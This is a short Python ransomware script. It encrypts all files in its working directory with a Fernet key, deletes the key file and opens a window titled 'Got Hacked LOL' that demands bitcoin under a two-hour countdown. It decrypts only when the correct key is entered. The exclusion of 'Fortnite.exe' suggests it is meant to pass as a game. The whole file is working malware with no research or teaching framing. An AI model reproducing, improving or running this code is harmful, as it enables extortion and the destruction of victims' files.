import os
import tkinter as tk
from cryptography.fernet import Fernet
from datetime import datetime, timedelta


files = []

for file in os.listdir():
	if file == "cr.py" or file == "Fortnite.exe" or file == "key.key" or file == "desktop.ini":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("key.key", "rb") as key:
	secretkey = key.read()


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	fernet = Fernet(secretkey)
	contents_encrypted = fernet.encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

os.remove("key.key")


def update_timer():
    remaining_time = end_time - datetime.now()
    if remaining_time.total_seconds() <= 0:
        timer_label.configure(text="Time's up!")
    else:
        remaining_time = remaining_time - timedelta(microseconds=remaining_time.microseconds)  # Remove milliseconds
        timer_label.configure(text=str(remaining_time)[2:])
        timer_label.after(1000, update_timer)

def save_input():
    global input_variable
    input_variable = entry.get()
    entry.delete(0, tk.END)
    window.destroy()

window = tk.Tk()
window.title("Got Hacked LOL")

display_label = tk.Label(window, text="You have been hacked!\nSend me bitcoin and I will send you the key to decrypt your files!", font=("Arial", 14))
display_label.pack(pady=10)

timer_label = tk.Label(window, text="", font=("Arial", 24))
timer_label.pack(pady=20)

end_time = datetime.now() + timedelta(hours=2)

update_timer()

entry = tk.Entry(window, font=("Arial", 12))
entry.pack(pady=10)

save_button = tk.Button(window, text="Enter", command=save_input)
save_button.pack(pady=10)

window.mainloop()

secretkey = input_variable

files = []

for file in os.listdir():
	if file == "cr.py" or file == "desktop.ini" or file == "Fortnite.exe":
		continue
	if os.path.isfile(file):
		files.append(file)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	fernet = Fernet(secretkey) 
	contents_decrypted = fernet.decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)